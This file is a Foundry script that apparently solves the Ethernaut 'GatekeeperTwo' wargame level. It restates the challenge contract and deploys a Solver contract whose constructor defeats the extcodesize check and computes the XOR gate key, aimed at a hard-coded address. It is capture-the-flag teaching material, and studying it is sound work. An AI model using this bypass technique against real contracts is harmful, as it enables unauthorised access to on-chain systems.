// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract GatekeeperTwo {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint256 x;
    assembly {
      x := extcodesize(caller())
    }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Solver {
  address public target;

  constructor(address _target) {
    target = _target;
    uint64 solution = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
    (bool success, ) = target.call(abi.encodeWithSignature("enter(bytes8)", bytes8(solution)));
    require(success, "Failed to solve");
    selfdestruct(payable(tx.origin));
  }
}

contract Solve is Script, Test {
  address target = address(0xFBBD7F440f951ef6ab89032Ab933b991b09fd493);

  function run() public {
    vm.startBroadcast();

    new Solver(target);

    vm.stopBroadcast();
  }
}
